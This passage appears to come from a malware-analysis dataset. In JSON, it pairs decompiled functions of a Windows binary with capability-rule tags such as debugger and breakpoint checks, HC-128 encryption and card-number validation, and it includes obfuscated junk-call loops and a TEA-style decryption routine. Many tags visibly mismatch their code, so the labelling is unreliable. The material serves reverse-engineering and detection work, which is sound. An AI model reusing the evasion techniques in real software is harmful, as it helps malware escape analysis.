*puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar14 = *0x41df1c + *0x41df08;\n                }\n                goto code_r0x00417fe0;\n            }\n            iVar13 = *0x41df0c - iVar13;\n            var_10h = uVar15;\n            var_ch = uVar4;\n            iVar14 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar13 & 0x1f;\n            var_8h = uVar3 << 0x10;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar13 = 2;\n            puVar10 = &var_8h + -iVar14;\n            do {\n                if (iVar13 < iVar14) {\n                    (&var_10h)[iVar13] = 0;\n                }\n                else {\n                    (&var_10h)[iVar13] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar13 = iVar13 + -1;\n            } while (-1 < iVar13);\n            iVar14 = *0x41df10 + -1;\n            iVar13 = *0x41df10 + (*0x41df10 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = 0x1f - (*0x41df10 & 0x1f);\n            puVar1 = &var_10h + iVar13;\n            if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar15 = (&var_10h)[iVar13] & ~(-1 << (uVar8 & 0x1f));\n                iVar16 = iVar13;\n                while (uVar15 == 0) {\n                    iVar16 = iVar16 + 1;\n                    if (2 < iVar16) goto code_r0x00417dd4;\n                    uVar15 = (&var_10h)[iVar16];\n                }\n                iVar16 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n                bVar6 = false;\n                uVar12 = 1 << (0x1f - (iVar14 & 0x1f) & 0x1f);\n                uVar4 = (&var_10h)[iVar16];\n                uVar15 = uVar4 + uVar12;\n                if ((uVar15 < uVar4) || (uVar15 < uVar12)) {\n                    bVar6 = true;\n                }\n                (&var_10h)[iVar16] = uVar15;\n                while ((iVar16 = iVar16 + -1,  -1 < iVar16 && (bVar6))) {\n                    uVar4 = (&var_10h)[iVar16];\n                    uVar15 = uVar4 + 1;\n                    bVar6 = false;\n                    if ((uVar15 < uVar4) || (uVar15 == 0)) {\n                        bVar6 = true;\n                    }\n                    (&var_10h)[iVar16] = uVar15;\n                }\n            }\ncode_r0x00417dd4:\n            *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n            iVar13 = iVar13 + 1;\n            if (iVar13 < 3) {\n                puVar10 = &var_10h + iVar13;\n                for (iVar14 = 3 - iVar13; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n            }\n            iVar13 = *0x41df14 + 1 + (*0x41df14 + 1 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = uVar5 + 1 & 0x1f;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar14 = 2;\n            puVar10 = &var_8h + -iVar13;\n            do {\n                if (iVar14 < iVar13) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\n        iVar14 = 0;\n    }\ncode_r0x00417fe0:\n    uVar15 = iVar14 << (0x1f - uVar5 & 0x1f) | -((uVar2 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (*0x41df18 == 0x40) {\n        arg_ch[1] = uVar15;\n        *arg_ch = var_ch;\n    }\n    else if (*0x41df18 == 0x20) {\n        *arg_ch = uVar15;\n    }\n    fcn.0040acd5(uVar2 & 0x8000);\n    return;\n}\n",
        "token_count": 3234
    },
    "0041a82a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041a82a(char *arg_8h, int32_t arg_ch, uint32_t *arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar4 = arg_10h;\n    uVar7 = 0;\n    var_4h._0_2_ = 0x404e;\n    *arg_10h = 0;\n    arg_10h[1] = 0;\n    arg_10h[2] = 0;\n    if (arg_ch != 0) {\n        arg_10h = NULL;\n        do {\n            uVar2 = *puVar4;\n            uVar9 = *puVar4;\n            uVar8 = puVar4[1];\n            uVar1 = puVar4[2];\n            bVar3 = false;\n            uVar5 = (uVar7 * 2 | uVar2 >> 0x1f) * 2 | uVar2 * 2 >> 0x1f;\n            uVar2 = uVar2 * 4;\n            uVar7 = (arg_10h * 2 | uVar7 >> 0x1f) * 2 | uVar7 * 2 >> 0x1f;\n            uVar6 = uVar9 + uVar2;\n            *puVar4 = uVar2;\n            puVar4[1] = uVar5;\n            puVar4[2] = uVar7;\n            if ((uVar6 < uVar2) || (uVar6 < uVar9)) {\n                bVar3 = true;\n            }\n            *puVar4 = uVar6;\n            uVar9 = uVar5;\n            if (bVar3) {\n                bVar3 = false;\n                uVar9 = uVar5 + 1;\n                if ((uVar9 < uVar5) || (uVar9 == 0)) {\n                    bVar3 = true;\n                }\n                puVar4[1] = uVar9;\n                if (bVar3) {\n                    uVar7 = uVar7 + 1;\n                    puVar4[2] = uVar7;\n                }\n            }\n            bVar3 = false;\n            uVar2 = uVar9 + uVar8;\n            if ((uVar2 < uVar9) || (uVar2 < uVar8)) {\n                bVar3 = true;\n            }\n            puVar4[1] = uVar2;\n            if (bVar3) {\n                uVar7 = uVar7 + 1;\n                puVar4[2] = uVar7;\n            }\n            bVar3 = false;\n            arg_10h = (uVar7 + uVar1) * 2 | uVar2 >> 0x1f;\n            uVar9 = uVar6 * 2;\n            uVar8 = uVar2 * 2 | uVar6 >> 0x1f;\n            puVar4[2] = arg_10h;\n            *puVar4 = uVar9;\n            puVar4[1] = uVar8;\n            uVar7 = uVar9 + *arg_8h;\n            if ((uVar7 < uVar9) || (uVar7 < *arg_8h)) {\n                bVar3 = true;\n            }\n            *puVar4 = uVar7;\n            uVar7 = uVar8;\n            if (bVar3) {\n                uVar7 = uVar8 + 1;\n                bVar3 = false;\n                if ((uVar7 < uVar8) || (uVar7 == 0)) {\n                    bVar3 = true;\n                }\n                puVar4[1] = uVar7;\n                if (bVar3) {\n                    arg_10h = arg_10h + 1;\n                    puVar4[2] = arg_10h;\n                }\n            }\n            arg_ch = arg_ch + -1;\n            arg_8h = arg_8h + 1;\n            puVar4[1] = uVar7;\n            puVar4[2] = arg_10h;\n        } while (arg_ch != 0);\n    }\n    if (puVar4[2] == 0) {\n        uVar7 = puVar4[1];\n        do {\n            var_4h._0_2_ = var_4h + -0x10;\n            uVar9 = uVar7 >> 0x10;\n            uVar7 = uVar7 << 0x10 | *puVar4 >> 0x10;\n            puVar4[1] = uVar7;\n            *puVar4 = *puVar4 << 0x10;\n        } while (uVar9 == 0);\n        puVar4[2] = uVar9;\n    }\n    uVar7 = puVar4[2];\n    if ((uVar7 & 0x8000) == 0) {\n        uVar9 = puVar4[1];\n        do {\n            var_4h._0_2_ = var_4h + -1;\n            uVar8 = uVar7 * 2;\n            uVar7 = uVar8 | uVar9 >> 0x1f;\n            uVar9 = uVar9 * 2 | *puVar4 >> 0x1f;\n            *puVar4 = *puVar4 * 2;\n            puVar4[1] = uVar9;\n            puVar4[2] = uVar7;\n        } while ((uVar8 & 0x8000) == 0);\n    }\n    *(puVar4 + 10) = var_4h;\n    return;\n}\n",
        "token_count": 1362
    },
    "0041b360": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint fcn.0041b360(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    int32_t unaff_EBX;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint uStack3232;\n    uint uStack3228;\n    uchar *puStack3224;\n    uchar *puStack3220;\n    uint uStack3216;\n    uchar *puStack3212;\n    uchar *puStack3208;\n    uint uStack3204;\n    uchar *puStack3200;\n    uint uStack3196;\n    uchar *puStack3192;\n    uint uStack3188;\n    uint uStack3184;\n    uint uStack3180;\n    uchar *puStack3176;\n    int32_t iStack3120;\n    uchar auStack2100 [24];\n    uchar auStack2076 [8];\n    uchar auStack2068 [2068];\n    \n    if (*0x2b75b64 == 0x422) {\n        fcn.0040427d(0, 0);\n        fcn.0040427d(0, 0x403608);\n        fcn.00404242(0);\n        fcn.0040399a(0, 0);\n        fcn.00404242(0);\n        fcn.00403850();\n        puStack3176 = 0x41b3d1;\n        fcn.0040427d(0x44c350, 0x403618);\n        fcn.00403b2c(0);\n        puStack3176 = 0x41b3e9;\n        fcn.004041b1(0, 0, 0);\n        puStack3176 = 0x41b3f7;\n        fcn.00403ef5(0, 0, 0);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GetCurrentActCtx;\n    iVar7 = 0;\n    do {\n        if (iVar7 == 0xff2) {\n            *0x2b75b64 = *0x2b75b64 + 0x38d6;\n        }\n        if (*0x2b75b64 == 0x534) {\n            (*pcVar2)();\n        }\n        pcVar3 = _sym.imp.KERNEL32.dll_SetLastError;\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x321aa6);\n    uVar8 = 0;\n    do {\n        if (uVar8 < 0x1c275) {\n            (*pcVar3)();\n        }\n    } while ((((uVar8 < 0x1ea070f4) || (unaff_EBX == 0xacd436)) || (iStack3120 == 0xad1af0c)) &&\n            (uVar8 = uVar8 + 1,  uVar8 < 0x8c238a18));\n    *0x2b75648 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n    pcVar6 = _sym.imp.KERNEL32.dll_EnumCalendarInfoExA;\n    pcVar4 = _sym.imp.KERNEL32.dll_DeleteFileW;\n    pcVar3 = _sym.imp.KERNEL32.dll_SearchPathA;\n    pcVar2 = _sym.imp.KERNEL32.dll_EnumCalendarInfoW;\n    iVar7 = 0x962ae8;\n    uVar8 = *0x2b75b64;\n    do {\n        if (uVar8 == 3) {\n            puStack3176 = NULL;\n            uStack3180 = 0x41b4b7;\n            (*_sym.imp.KERNEL32.dll_FindNextFileA)();\n            uVar8 = *0x2b75b64;\n        }\n        if (uVar8 == 0xd) {\n            puStack3176 = NULL;\n            uStack3180 = 0;\n            uStack3184 = 0;\n            uStack3188 = 0x41b4cb;\n            (*pcVar6)();\n            uStack3188 = 0;\n            puStack3192 = NULL;\n            uStack3196 = 0;\n            puStack3200 = NULL;\n            uStack3204 = 0x41b4d5;\n            (*pcVar2)();\n            uStack3204 = 0;\n            puStack3208 = 0x41b4d9;\n            (*pcVar4)();\n            puStack3208 = &stack0xfffff394;\n            puStack3212 = &stack0xfffff7cc;\n            uStack3216 = 0;\n            puStack3220 = NULL;\n            puStack3224 = NULL;\n            uStack3228 = 0;\n            uStack3232 = 0x41b4f0;\n            (*pcVar3)();\n            uStack3232 = 0;\n            (*_sym.imp.KERNEL32.dll_CreateMutexW)(0, 0);\n            (*_sym.imp.KERNEL32.dll_GetPrivateProfileSectionNamesA)(&stack0xfffff3a8, 0, 0);\n            (*_sym.imp.KERNEL32.dll_GetStringTypeA)(0, 0, 0, 0, &stack0xfffff360);\n            uVar8 = *0x2b75b64;\n        }\n        pcVar5 = _sym.imp.KERNEL32.dll_TerminateProcess;\n        pcVar1 = _sym.imp.KERNEL32.dll__llseek;\n        iVar7 = iVar7 + -1;\n    } while (iVar7 != 0);\n    uVar9 = 0;\n    if (uVar8 != 0) {\n        do {\n            if (uVar8 == 0xfe) {\n                puStack3176 = NULL;\n                uStack3180 = 0;\n                uStack3184 = 0x41b54f;\n                (*pcVar1)();\n                uStack3184 = 0;\n                uStack3188 = 0;\n                puStack3192 = 0x41b555;\n                (*pcVar5)();\n            }\n            fcn.0041b0a0();\n            uVar9 = uVar9 + 1;\n            uVar8 = *0x2b75b64;\n        } while (uVar9 < *0x2b75b64);\n    }\n    if (uVar8 == 0x19c) {\n        puStack3176 = 0x41b576;\n        (*_sym.imp.KERNEL32.dll_AddAtomW)();\n        puStack3176 = NULL;\n        uStack3180 = 0;\n        uStack3184 = 0;\n        uStack3188 = 0x41b582;\n        (*_sym.imp.KERNEL32.dll_EnumTimeFormatsW)();\n        uStack3188 = 0;\n        puStack3192 = NULL;\n        uStack3196 = 0x41b58c;\n        (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryW)();\n        uStack3196 = 0;\n        puStack3200 = NULL;\n        uStack3204 = 0;\n        puStack3208 = NULL;\n        puStack3212 = 0x41b59a;\n        (*_sym.imp.KERNEL32.dll_SetCalendarInfoA)();\n        puStack3212 = NULL;\n        uStack3216 = 0;\n        puStack3220 = 0x41b5a4;\n        (*_sym.imp.KERNEL32.dll_lstrcmpW)();\n    }\n    pcVar2 = _sym.imp.USER32.dll_LoadMenuW;\n    iVar7 = 0x8dc;\n    do {\n        puStack3176 = NULL;\n        uStack3180 = 0x41b5b6;\n        (*pcVar2)();\n        pcVar4 = _sym.imp.KERNEL32.dll_AddAtomA;\n        pcVar3 = _sym.imp.KERNEL32.dll_WaitForSingleObject;\n        iVar7 = iVar7 + -1;\n    } while (iVar7 != 0);\n    iVar7 = 0x25865;\n    do {\n        if (*0x2b75b64 == 0x15a) {\n            puStack3176 = 0x41b5dc;\n            (*pcVar4)();\n            puStack3176 = NULL;\n            uStack3180 = 0;\n            uStack3184 = 0x41b5e2;\n            (*pcVar3)();\n        }\n        iVar7 = iVar7 + -1;\n    } while (iVar7 != 0);\n    *0x44c350 = 0;\n    fcn.0041abe0();\n    fcn.0041b330();\n    fcn.0041b080();\n    pcVar6 = _sym.imp.KERNEL32.dll_GlobalUnlock;\n    pcVar4 = _sym.imp.KERNEL32.dll_WritePrivateProfileSectionW;\n    pcVar3 = _sym.imp.KERNEL32.dll_GetConsoleAliasW;\n    pcVar2 = _sym.imp.KERNEL32.dll_InitializeCriticalSection;\n    iVar7 = 0xdd7b3;\n    do {\n        if (*0x2b75b64 == 0x21) {\n            puStack3176 = NULL;\n            uStack3180 = 0;\n            uStack3184 = 0x41b631;\n            (*pcVar4)();\n            uStack3184 = 0;\n            uStack3188 = 0;\n            puStack3192 = &stack0xfffff7e4;\n            uStack3196 = 0;\n            puStack3200 = 0x41b641;\n            (*pcVar3)();\n            puStack3200 = &stack0xfffff3a0;\n            uStack3204 = 0x41b648;\n            (*pcVar2)();\n            uStack3204 = 0;\n            puStack3208 = 0x41b64c;\n            (*pcVar6)();\n        }\n        iVar7 = iVar7 + -1;\n    } while (iVar7 != 0);\n    fcn.0041b2d0();\n    *0x44c351 = 0x73;\n    if (*0x2b75b64 == 0x58c) {\n        puStack3176 = 0x41b676;\n        (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsW)();\n        puStack3176 = &stack0xfffff7ec;\n        uStack3180 = 0;\n        uStack3184 = 0x41b686;\n        (*_sym.imp.KERNEL32.dll_FindNextFileW)();\n        uStack3184 = 0;\n        uStack3188 = 0x41b68e;\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n        uStack3188 = 0;\n        puStack3192 = NULL;\n        uStack3196 = 0;\n        puStack3200 = 0x41b69a;\n        (*_sym.imp.KERNEL32.dll_EnumResourceTypesW)();\n        puStack3200 = 0x403634;\n        uStack3204 = 0x41b6a5;\n        (*_sym.imp.KERNEL32.dll_GetFileAttributesA)();\n        uStack3204 = 0;\n        puStack3208 = NULL;\n        puStack3212 = NULL;\n        uStack3216 = 0x41b6b1;\n        (*_sym.imp.KERNEL32.dll_OpenWaitableTimerW)();\n        uStack3216 = 0x30;\n        puStack3224 = &stack0xfffff394;\n        puStack3220 = NULL;\n        uStack3184 = 0;\n        uStack3228 = 0x41b6c7;\n        fcn.0040acf0();\n        uStack3216 = 0;\n        puStack3220 = &stack0xfffff390;\n        puStack3224 = NULL;\n        uStack3228 = 0x41b6d9;\n        (*_sym.imp.KERNEL32.dll_SetDefaultCommConfigW)();\n        uStack3228 = 0x403650;\n        uStack3232 = 0;\n        (*_sym.imp.KERNEL32.dll_OpenMutexW)(0);\n        (*_sym.imp.KERNEL32.dll_WriteConsoleInputA)(0, 0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_GetCPInfoExW)(0, 0, &stack0xfffff39c);\n    }\n    fcn.0041b090();\n    return 0;\n}\n",
        "token_count": 2734
    },
    "00414f2c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00414f2c(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00408260(0x41c190, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.0040461b();\n        *puVar2 = 0;\n        puVar2 = fcn.00404608();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x2b75f88)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x2b75fa0;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.00416a1a(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.00404608();\n                    *puVar2 = 9;\n                    puVar2 = fcn.0040461b();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0041482f(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.00414ff8();\n                goto code_r0x00414fef;\n            }\n        }\n        puVar2 = fcn.0040461b();\n        *puVar2 = 0;\n        puVar2 = fcn.00404608();\n        *puVar2 = 9;\n        fcn.00406373();\n    }\ncode_r0x00414fef:\n    fcn.004082a5();\n    return;\n}\n",
        "token_count": 609
    },
    "00416d67": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.00416d67(void)\n\n{\n    uint8_t *puVar1;\n    int32_t unaff_EBP;\n    uint32_t unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) == unaff_EDI) {\n        puVar1 = *((unaff_ESI >> 5) * 4 + 0x2b75fa0) + 4 + (unaff_ESI & 0x1f) * 0x40;\n        *puVar1 = *puVar1 & 0xfe;\n    }\n    fcn.00416ab9(unaff_ESI);\n    return;\n}\n",
        "token_count": 160
    },
    "0041b130": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid fcn.0041b130(uint32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iStack16;\n    \n    iVar4 = *0x44b624;\n    iVar3 = *0x44b620;\n    iVar2 = *0x44b61c;\n    iVar1 = *0x44b618;\n    uVar5 = *param_1;\n    uVar6 = param_1[1];\n    iVar7 = -0x3910c8e0;\n    iStack16 = 0x20;\n    do {\n        if (*0x2b75b64 == 0x1b) {\n            (*_sym.imp.KERNEL32.dll_LocalCompact)(0);\n        }\n        *0x2b7564c = 0;\n        uVar6 = uVar6 - ((uVar5 >> 5) + iVar4 ^ iVar7 + uVar5 ^ uVar5 * 0x10 + iVar3);\n        *0x2b75650 = 0xff6b3619;\n        *0x2b75654 = 0xffffffff;\n        uVar5 = uVar5 - (uVar6 * 0x10 + iVar1 ^ iVar7 + uVar6 ^ (uVar6 >> 5) + iVar2);\n        if (*0x2b75b64 != 0x93) {\n            iVar7 = iVar7 + 0x61c88647;\n        }\n        iStack16 = iStack16 + -1;\n    } while (iStack16 != 0);\n    param_1[1] = uVar6;\n    *param_1 = uVar5;\n    return;\n}\n",
        "token_count": 412
    },
    "0041b330": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.0041b330(void)\n\n{\n    uint32_t uVar1;\n    \n    for (uVar1 = *0x2b75b64 >> 3; uVar1 != 0; uVar1 = uVar1 - 1) {\n        fcn.0041b130();\n    }\n    return;\n}\n",
        "token_count": 74
    },
    "00403850": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.00403850(float param_1)\n\n{\n    float10 fVar1;\n    \n    fVar1 = fcn.004039d0(param_1);\n    return fVar1;\n}\n",
        "token_count": 46
    },
    "0040427d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.0040427d(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint arg_10h;\n    uint var_4h;\n    \n    fcn.00408260(0x41be30, 0xc);\n    if (*(unaff_EBP + 8) == 0) {\n        puVar1 = fcn.00404608();\n        *puVar1 = 0x16;\n        fcn.00406373();\n    }\n    else {\n        iVar2 = fcn.004073ea();\n        fcn.00407502(1, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0;\n        iVar2 = fcn.004073ea();\n        arg_8h_00 = fcn.0040759f(iVar2 + 0x20);\n        iVar2 = unaff_EBP + 0xc;\n        arg_10h = 0;\n        uVar4 = *(unaff_EBP + 8);\n        iVar3 = fcn.004073ea();\n        uVar4 = fcn.004076a9(iVar3 + 0x20, uVar4, arg_10h, iVar2);\n        *(unaff_EBP + -0x1c) = uVar4;\n        iVar2 = fcn.004073ea();\n        fcn.0040763b(arg_8h_00, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.00404311();\n    }\n    fcn.004082a5();\n    return;\n}\n",
        "token_count": 440
    },
    "00404311": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404311(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004073ea();\n    fcn.00407570(1, iVar1 + 0x20);\n    return;\n}\n",
        "token_count": 52
    },
    "00404324": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404324(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00408504(arg_8h, arg_ch, &arg_10h);\n    return;\n}\n",
        "token_count": 52
    },
    "0040433d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040433d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00408521(arg_8h, arg_ch, &arg_10h);\n    return;\n}\n",
        "token_count": 53
    },
    "00404356": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404356(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00408521(arg_8h, 0, &arg_ch);\n    return;\n}\n",
        "token_count": 44
    },
    "0040436e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040436e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0040853e(arg_8h, arg_ch, &arg_10h);\n    return;\n}\n",
        "token_count": 54
    },
    "00404387": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404387(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0040853e(arg_8h, 0, &arg_ch);\n    return;\n}\n",
        "token_count": 45
    },
    "00404dd8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404dd8(uint arg_8h)\n\n{\n    fcn.00404c98(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "0040847f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.0040847f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint arg_8h_00;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00408260(0x41bfc8, 0x10);\n    iVar1 = fcn.004073ea();\n    iVar1 = iVar1 + 0x20;\n    *(unaff_EBP + -0x1c) = iVar1;\n    if (*(unaff_EBP + 0xc) == 0) {\n        puVar2 = fcn.00404608();\n        *puVar2 = 0x16;\n        fcn.00406373();\n    }\n    else {\n        fcn.004074c1(iVar1);\n        *(unaff_EBP + -4) = 0;\n        arg_8h_00 = fcn.0040759f(iVar1);\n        uVar3 = (**(unaff_EBP + 8))(iVar1, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n        *(unaff_EBP + -0x20) = uVar3;\n        fcn.0040763b(arg_8h_00, iVar1);\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.004084fc();\n    }\n    fcn.004082a5();\n    return;\n}\n",
        "token_count": 424
    },
    "00408504": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408504(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0040847f(fcn.004076a9, arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 60
    },
    "00408521": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408521(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0040847f(fcn.00410d4f, arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 61
    },
    "0040853e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040853e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0040847f(fcn.00411a4a, arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 62
    },
    "0040855b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040855b(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0040847f(fcn.004076a9, arg_8h, 0, arg_ch);\n    return;\n}\n",
        "token_count": 53
    },
    "00408577": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408577(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0040847f(fcn.00410d4f, arg_8h, 0, arg_ch);\n    return;\n}\n",
        "token_count": 53
    },
    "00408593": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408593(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0040847f(fcn.00411a4a, arg_8h, 0, arg_ch);\n    return;\n}\n",
        "token_count": 53
    },
    "00408e5d": {
        "rules": [
